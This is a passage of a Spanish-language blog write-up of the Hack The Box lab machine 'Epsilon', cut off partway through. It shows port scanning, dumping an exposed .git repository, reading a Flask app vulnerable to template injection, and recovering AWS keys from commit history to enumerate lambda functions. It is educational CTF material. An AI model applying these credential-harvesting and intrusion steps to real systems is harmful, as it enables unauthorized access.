<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Epsilon HTB Write-up - grafis Blog</title>
<meta name="description" content="En este artículo comparto el write up de la máquina Epsilon de Hack The Box">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="grafis Blog">
<meta property="og:title" content="Epsilon HTB Write-up">
<meta property="og:url" content="http://localhost:4000/Epsilon/">


  <meta property="og:description" content="En este artículo comparto el write up de la máquina Epsilon de Hack The Box">



  <meta property="og:image" content="http://localhost:4000/imagenes/Epsilon/Epsilon_logo.png">





  <meta property="article:published_time" content="2023-03-04T00:00:00-05:00">





  

  


<link rel="canonical" href="http://localhost:4000/Epsilon/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "grafis",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="grafis Blog Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Artículos</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categorías</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Etiquetas</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Buscador</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >About</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Epsilon HTB Write-up</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="grafis" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">grafis</h3>
    
    
      <p class="author__bio" itemprop="description">
        Estudiante de Ingeniería Civil en Informática y Telecomunicaciones
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/mirko-babic-velásquez-4979bb219" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/grafis0" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Epsilon HTB Write-up">
    <meta itemprop="description" content="En este artículo comparto el write up de la máquina Epsilon de Hack The Box">
    <meta itemprop="datePublished" content="March 04, 2023">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Epsilon HTB Write-up
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-03-04T00:00:00-05:00">March 04, 2023 </time>&emsp;
          
          
        </p>
        <p align="center">
<img src="/imagenes/Epsilon/Epsilon_banner.png" width="550" height="250" />
</p>

<h1 id="resumen"><a href="#header-2"></a>Resumen</h1>

<p>Saludos, en esta oportunidad vamos a resolver la máquina de <strong>Hack The Box</strong> llamada <strong>Epsilon</strong>, la cual tiene una dificultad media. Para lograr vulnerarla realizaremos lo siguiente:</p>

<ul>
  <li>Enumeración del sistema.</li>
  <li>Obtención de repositorio git.</li>
  <li>Enumeración de AWS.</li>
  <li>Descubrimiento de funciones lambda del servidor.</li>
  <li>Creación de un JWT.</li>
  <li>Bypass del panel de login.</li>
  <li>SSTI.</li>
  <li>Abuso de symlink.</li>
</ul>

<h2 id="reconocimiento-y-enumeración"><a href="#header-2"></a>Reconocimiento y Enumeración</h2>

<p>En primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando <code class="language-plaintext highlighter-rouge">ping</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.11.134

PING 10.10.11.134 (10.10.11.134) 56(84) bytes of data.
64 bytes from 10.10.11.134: icmp_seq=1 ttl=63 time=149 ms
</code></pre></div></div>
<p>Se observa que existe una correcta conexión con la máquina.</p>

<p>Para realizar un reconocimiento activo se utilizará la herramienta <code class="language-plaintext highlighter-rouge">nmap</code>, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro <code class="language-plaintext highlighter-rouge">-sS</code> el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- -sS -open --min-rate 5000 10.10.11.134 -oG Port
</code></pre></div></div>
<p>Al finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp
</code></pre></div></div>
<p>Realizamos un escaneo de los servicios expuestos utilizando <code class="language-plaintext highlighter-rouge">nmap</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sCV -p22,80,5000 10.10.11.134 -oN ServiceScan
</code></pre></div></div>

<p>Como resultado del escaneo tenemos:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
| http-git: 
|   10.10.11.134:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.41 (Ubuntu)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Costume Shop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<p>Podemos observar 2 servidores http, utilizando la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code> vamos a ver si podemos sacar un poco de información extra:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 10.10.11.134

http://10.10.11.134 [403 Forbidden] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.134], Title[403 Forbidden]
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 10.10.11.134:5000

http://10.10.11.134:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.8.10], IP[10.10.11.134], PasswordField[password], Python[3.8.10], Script, Title[Costume Shop], Werkzeug[2.0.2]
</code></pre></div></div>

<p>Para la primera web no podemos ver mucho y la segunda web está utilizando python, lo que es interesante para pensar en futuros ataques que podríamos intentar.</p>

<p>Vamos a revisar la web que está en el puerto 5000:</p>

<p><img src="/imagenes/Epsilon/epsilon_1.png" alt="" /></p>

<p>Vemos un panel de autenticación, sin embargo, por el momento no tenemos niguna credencial que nos pueda servir y las típicas no funcionan.</p>

<h2 id="explotación"><a href="#header-2"></a>Explotación</h2>

<p>Antes de intentar las injecciones vamos a revisar un archivo interesante que está en nuestra captura de <code class="language-plaintext highlighter-rouge">nmap</code>, el repositorio de git, para ello vamos a utilizar la herramienta <code class="language-plaintext highlighter-rouge">git_dumper</code>, disponible en <a href="https://github.com/arthaud/git-dumper">github</a> :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 git_dumper.py http://10.10.11.134/.git pagina
</code></pre></div></div>

<p>En este caso vamos a guardar toda la información en la carpeta <strong>pagina</strong>. Luego de esperar a que termine la ejecución de la herramienta vamos a ver que ha encontrado:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls

server.py  track_api_CR_148.py
</code></pre></div></div>

<p>Tenemos dos scripts en python, vamos a revisarlos:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="nn">jwt</span>
<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">secret</span> <span class="o">=</span> <span class="s">'&lt;secret_key&gt;'</span>

<span class="k">def</span> <span class="nf">verify_jwt</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="n">key</span><span class="p">):</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">username</span><span class="o">=</span><span class="n">jwt</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s">'HS256'</span><span class="p">,])[</span><span class="s">'username'</span><span class="p">]</span>
		<span class="k">if</span> <span class="n">username</span><span class="p">:</span>
			<span class="k">return</span> <span class="bp">True</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">return</span> <span class="bp">False</span>
	<span class="k">except</span><span class="p">:</span>
		<span class="k">return</span> <span class="bp">False</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"GET"</span><span class="p">,</span><span class="s">"POST"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
	<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="o">==</span><span class="s">"POST"</span><span class="p">:</span>
		<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span><span class="o">==</span><span class="s">"admin"</span> <span class="ow">and</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'password'</span><span class="p">]</span><span class="o">==</span><span class="s">"admin"</span><span class="p">:</span>
			<span class="n">res</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">()</span>
			<span class="n">username</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span>
			<span class="n">token</span><span class="o">=</span><span class="n">jwt</span><span class="p">.</span><span class="n">encode</span><span class="p">({</span><span class="s">"username"</span><span class="p">:</span><span class="s">"admin"</span><span class="p">},</span><span class="n">secret</span><span class="p">,</span><span class="n">algorithm</span><span class="o">=</span><span class="s">"HS256"</span><span class="p">)</span>
			<span class="n">res</span><span class="p">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s">"auth"</span><span class="p">,</span><span class="n">token</span><span class="p">)</span>
			<span class="n">res</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'location'</span><span class="p">]</span><span class="o">=</span><span class="s">'/home'</span>
			<span class="k">return</span> <span class="n">res</span><span class="p">,</span><span class="mi">302</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'index.html'</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'index.html'</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/home"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
	<span class="k">if</span> <span class="n">verify_jwt</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'auth'</span><span class="p">),</span><span class="n">secret</span><span class="p">):</span>
		<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'home.html'</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span><span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/track"</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"GET"</span><span class="p">,</span><span class="s">"POST"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">track</span><span class="p">():</span>
	<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="o">==</span><span class="s">"POST"</span><span class="p">:</span>
		<span class="k">if</span> <span class="n">verify_jwt</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'auth'</span><span class="p">),</span><span class="n">secret</span><span class="p">):</span>
			<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'track.html'</span><span class="p">,</span><span class="n">message</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span><span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'track.html'</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/order'</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"GET"</span><span class="p">,</span><span class="s">"POST"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">order</span><span class="p">():</span>
	<span class="k">if</span> <span class="n">verify_jwt</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'auth'</span><span class="p">),</span><span class="n">secret</span><span class="p">):</span>
		<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="o">==</span><span class="s">"POST"</span><span class="p">:</span>
			<span class="n">costume</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">"costume"</span><span class="p">]</span>
			<span class="n">message</span> <span class="o">=</span> <span class="s">'''
			Your order of "{}" has been placed successfully.
			'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">costume</span><span class="p">)</span>
			<span class="n">tmpl</span><span class="o">=</span><span class="n">render_template_string</span><span class="p">(</span><span class="n">message</span><span class="p">,</span><span class="n">costume</span><span class="o">=</span><span class="n">costume</span><span class="p">)</span>
			<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'order.html'</span><span class="p">,</span><span class="n">message</span><span class="o">=</span><span class="n">tmpl</span><span class="p">)</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'order.html'</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span><span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
<span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="s">'true'</span><span class="p">)</span>
</code></pre></div></div>

<p>El primer código podemos ver que corresponde al servidor, en este caso está utilizando <strong>Flask</strong>, lo cual es interesante pues podría ser vulnerable a SSTI. Luego, podemos observar las rutas de la página, las cuales verifican la existencia de un JWT (Json Web Token), podríamos contruir este JWT para utilizarlo para ingresar a la web, sin embargo, no disponemos del “secret”.</p>

<p>Vamos a revisar el segundo script:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">io</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">from</span> <span class="nn">zipfile</span> <span class="kn">import</span> <span class="n">ZipFile</span>
<span class="kn">from</span> <span class="nn">boto3.session</span> <span class="kn">import</span> <span class="n">Session</span>


<span class="n">session</span> <span class="o">=</span> <span class="n">Session</span><span class="p">(</span>
    <span class="n">aws_access_key_id</span><span class="o">=</span><span class="s">'&lt;aws_access_key_id&gt;'</span><span class="p">,</span>
    <span class="n">aws_secret_access_key</span><span class="o">=</span><span class="s">'&lt;aws_secret_access_key&gt;'</span><span class="p">,</span>
    <span class="n">region_name</span><span class="o">=</span><span class="s">'us-east-1'</span><span class="p">,</span>
    <span class="n">endpoint_url</span><span class="o">=</span><span class="s">'http://cloud.epsilon.htb'</span><span class="p">)</span>
<span class="n">aws_lambda</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">client</span><span class="p">(</span><span class="s">'lambda'</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">files_to_zip</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">root</span><span class="p">,</span> <span class="n">dirs</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="n">walk</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
            <span class="n">full_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
            <span class="n">archive_name</span> <span class="o">=</span> <span class="n">full_path</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">sep</span><span class="p">):]</span>
            <span class="k">yield</span> <span class="n">full_path</span><span class="p">,</span> <span class="n">archive_name</span>


<span class="k">def</span> <span class="nf">make_zip_file_bytes</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
    <span class="n">buf</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">BytesIO</span><span class="p">()</span>
    <span class="k">with</span> <span class="n">ZipFile</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">z</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">full_path</span><span class="p">,</span> <span class="n">archive_name</span> <span class="ow">in</span> <span class="n">files_to_zip</span><span class="p">(</span><span class="n">path</span><span class="o">=</span><span class="n">path</span><span class="p">):</span>
            <span class="n">z</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">full_path</span><span class="p">,</span> <span class="n">archive_name</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">buf</span><span class="p">.</span><span class="n">getvalue</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">update_lambda</span><span class="p">(</span><span class="n">lambda_name</span><span class="p">,</span> <span class="n">lambda_code_path</span><span class="p">):</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isdir</span><span class="p">(</span><span class="n">lambda_code_path</span><span class="p">):</span>
        <span class="k">raise</span> <span class="nb">ValueError</span><span class="p">(</span><span class="s">'Lambda directory does not exist: {0}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">lambda_code_path</span><span class="p">))</span>
    <span class="n">aws_lambda</span><span class="p">.</span><span class="n">update_function_code</span><span class="p">(</span>
        <span class="n">FunctionName</span><span class="o">=</span><span class="n">lambda_name</span><span class="p">,</span>
        <span class="n">ZipFile</span><span class="o">=</span><span class="n">make_zip_file_bytes</span><span class="p">(</span><span class="n">path</span><span class="o">=</span><span class="n">lambda_code_path</span><span class="p">))</span>
</code></pre></div></div>

<p>Observamos que está utilizando aws, el cual se está conectando a un endpoint llamado <strong>cloud.epsilon.htb</strong>, al final del código podemos observar la utilización de funciones lambda, las cuales según la página oficial de aws son “<strong>un servicio informático que permite ejecutar código sin aprovisionar ni administrar servidores.</strong>”, por lo tanto, podemos pensar que está ejecutando código por detrás, vamos a buscar alguna forma de encontrar esta función lambda. Para ello vamos a utilizar el servicio de aws-cli, vamos a descargarlo desde la <a href="https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html">página_oficial</a> de AWS:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws --version

aws-cli/2.11.0 Python/3.11.2 Linux/6.0.0-kali6-amd64 exe/x86_64.kali.2022 prompt/off
</code></pre></div></div>

<p>Luego, teniendo ya listo lo anterior, vamos a intentar conectarnos al endpoint que vimos anteriormente, el primer paso corresponde agregar esta dirección en el /etc/hosts para que pueda resolver correctamente a la IP:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.134    epsilon.htb cloud.epsilon.htb
</code></pre></div></div>

<p>Con esto listo, necesitamos configurar nuestra sesión, para ello haremos lo siguiente:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws configure
AWS Access Key ID [None]: 
</code></pre></div></div>

<p>Vemos que está pidiendo un <strong>AWS access key ID</strong>, la cual no disponemos, sin embargo, si volvemos al código en python podemos ver que se mencionan:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">session</span> <span class="o">=</span> <span class="n">Session</span><span class="p">(</span>
    <span class="n">aws_access_key_id</span><span class="o">=</span><span class="s">'&lt;aws_access_key_id&gt;'</span><span class="p">,</span>
    <span class="n">aws_secret_access_key</span><span class="o">=</span><span class="s">'&lt;aws_secret_access_key&gt;'</span><span class="p">,</span>
    <span class="n">region_name</span><span class="o">=</span><span class="s">'us-east-1'</span><span class="p">,</span>
    <span class="n">endpoint_url</span><span class="o">=</span><span class="s">'http://cloud.epsilon.htb'</span><span class="p">)</span>
<span class="n">aws_lambda</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">client</span><span class="p">(</span><span class="s">'lambda'</span><span class="p">)</span>
</code></pre></div></div>
<p>Pero no están allí, aunque tenemos que recordar que estamos en un repositorio de git, puede darse el caso en que versiones anteriores del proyecto podamos encontrar información sobre esto, para ello hacemos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git log


commit c622771686bd74c16ece91193d29f85b5f9ffa91 (HEAD -&gt; master)
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov 17 17:41:07 2021 +0000

    Fixed Typo

commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov 17 10:02:59 2021 +0000

    Adding Costume Site

commit c51441640fd25e9fba42725147595b5918eba0f1
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov 17 10:00:58 2021 +0000

    Updatig Tracking API

commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov 17 10:00:28 2021 +0000

    Adding Tracking API Module
</code></pre></div></div>
<p>Observamos todos los commit disponibles del proyecto, vemos uno interesante llamado <strong>Adding Tracking API Module</strong>, el cual fue antes que lo actualizaran asi que vamos a ver que encontramos:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git show 7cf92a7a09e523c1c667d13847c9ba22464412f3

commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov 17 10:00:28 2021 +0000

    Adding Tracking API Module

diff --git a/track_api_CR_148.py b/track_api_CR_148.py
new file mode 100644
index 0000000..fed7ab9
--- /dev/null
+++ b/track_api_CR_148.py
@@ -0,0 +1,36 @@
+import io
+import os
+from zipfile import ZipFile
+from boto3.session import Session
+
+
+session = Session(
+    aws_access_key_id='AQLA5M37BDN6FJP76TDC',
+    aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',
+    region_name='us-east-1',
+    endpoint_url='http://cloud.epsilong.htb')
+aws_lambda = session.client('lambda')    
+
</code></pre></div></div>

<p>Vemos las key, por lo tanto, vamos a intentar utilizarlas para configurar la sesión e intentar conectarnos al endpoint para enumerar las funciones lambda:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws configure

AWS Access Key ID [None]: AQLA5M37BDN6FJP76TDC
AWS Secret Access Key [None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
Default region name [None]: us-east-1
Default output format [None]: json
</code></pre></div></div>

<p>Tenemos listas las credenciales, vamos a intentar conectarnos al endpoint, si vemos el panel de ayuda:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GLOBAL OPTIONS
       --debug (boolean)

       Turn on debug logging.

       --endpoint-url (string)
</code></pre></div></div>

<p>Tenemos un parámetro para el endpoint, vamos a utilizarlo:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws --endpoint-url=http://cloud.epsilon.htb

usage: aws [options] &lt;command&gt; &lt;subcommand&gt; [&lt;subcommand&gt; ...] [parameters]
To see help text, you can run:

  aws help
  aws &lt;command&gt; help
  aws &lt;command&gt; &lt;subcommand&gt; help

aws: error: the following arguments are required: command
</code></pre></div></div>

<p>Vemos que necesitamos ingresar un comando, para ello vamos a hacer caso y buscaremos en la sección de ayuda:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>       o lambda
</code></pre></div></div>

<p>Vemos que hay un comando lambda, vamos a utilizarlo:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws --endpoint-url=http://cloud.epsilon.htb lambda

usage: aws [options] &lt;command&gt; &lt;subcommand&gt; [&lt;subcommand&gt; ...] [parameters]
To see help text, you can run:

  aws help
  aws &lt;command&gt; help
  aws &lt;command&gt; &lt;subcommand&gt; help

aws: error: the following arguments are required: operation
</code></pre></div></div>

<p>Vamos a buscar formas de enumerar las funciones lambda en el panel de ayuda:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>       o list-functions
</code></pre></div></div>

<p>Vemos un comando llamado list-functions, esto es lo que necesitamos para ver qué funciones lambda se están ejecutando:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"Functions"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"FunctionName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"costume_shop_v1"</span><span class="p">,</span><span class="w">
